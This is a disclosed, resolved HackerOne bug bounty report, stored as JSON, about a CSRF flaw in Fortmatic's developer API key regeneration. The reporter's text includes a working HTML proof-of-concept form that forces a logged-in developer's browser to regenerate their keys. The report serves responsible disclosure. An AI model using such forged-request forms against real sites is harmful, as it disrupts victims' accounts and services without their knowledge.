{
  "id": 593893,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81OTM4OTM=",
  "url": "https://hackerone.com/reports/593893",
  "title": "CSRF in generating developer api_key",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-06-02T05:26:42.271Z",
  "submitted_at": "2019-06-02T05:26:42.271Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mr_r0w07",
    "url": "/mr_r0w07",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MjAzNjAsInB1ciI6ImJsb2JfaWQifX0=--eff04b15c85e18e6e6d88e33d5330f661dd2178e/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--a4d91faed3dff6024dfc1a7b7f8ccc6b45e38396/pepe_hax.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35713,
    "url": "https://hackerone.com/magic-bbp",
    "handle": "magic-bbp",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/xa2v75cq5q266cr06qrzshz8tk1h/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/xa2v75cq5q266cr06qrzshz8tk1h/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Magic",
      "twitter_handle": "magic_labs",
      "website": "https://magic.link",
      "about": "Future-proof Passwordless Authentication"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-11-01T01:35:36.535Z",
  "bug_reporter_agreed_on_going_public_at": "2019-11-01T01:35:36.422Z",
  "team_member_agreed_on_going_public_at": "2019-11-01T00:18:12.618Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi\n\nAt https://dashboard.forttmatic.com when developer tries to generate new api_key for his application, a POST request is sent to https://api.forttmatic.com which doesn't have any tokens to guard against CSRF attacks.\n\n###CSRF POC :\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://api.fortmatic.com/v1/dashboard/api_user/keys/regenerate\" method=\"POST\" enctype=\"text/plain\">\n      <input type=\"hidden\" name=\"&#123;&#125;\" value=\"\" />\n      <input type=\"submit\" value=\"Generate New Keys\" />\n    </form>\n  </body>\n</html>\n\n``` \n\nOn submitting the above request, a new set of keys would be generated which destroys the current api_key set without the knowledge of developer.\n\n## Impact\n\nIt doesn't have a great security impact other than that this would make the developer's app unusable because he would have to change the api_keys everywhere on his code to make the application working again.\nThis could be done any number of times. Everytime the developer has attacker's site opened in his browser keys would be regenerated leading to developer being left frustrated as to why his api_keys keep on changing even when he didn't ask for it and the pain to replace old pair of keys with the new one! :)",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-12-01T00:18:12.751Z",
  "allow_singular_disclosure_after": -183303503.5496861,
  "singular_disclosure_allowed": true,
  "vote_count": 17,
  "voters": [
    "loaymorad",
    "proper-lay",
    "sameerphad72",
    "sainttobs",
    "mik317",
    "thalaivar304",
    "term1nal",
    "bb00x",
    "lumbridge",
    "zimmer75",
    "and 7 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 17841,
    "asset_type": "URL",
    "asset_identifier": "api.fortmatic.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
